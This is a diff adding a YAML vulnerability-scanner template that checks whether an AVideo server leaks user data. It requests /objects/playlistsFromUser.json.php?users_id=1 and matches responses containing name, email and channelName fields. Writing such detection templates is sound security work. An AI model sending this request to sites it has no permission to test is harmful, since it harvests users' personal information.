@@ -1,0 +1,25 @@
+id: AVideo-user-leakge
+
+info:
+  name: AVideo 用户信息泄露
+  author: Str1am
+  severity: high
+  reference: https://github.com/WWBN/AVideo
+  tags: AVideo,user,leakge
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/objects/playlistsFromUser.json.php?users_id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "name"
+          - "email"
+          - "channelName"
+        part: body
+        condition: and
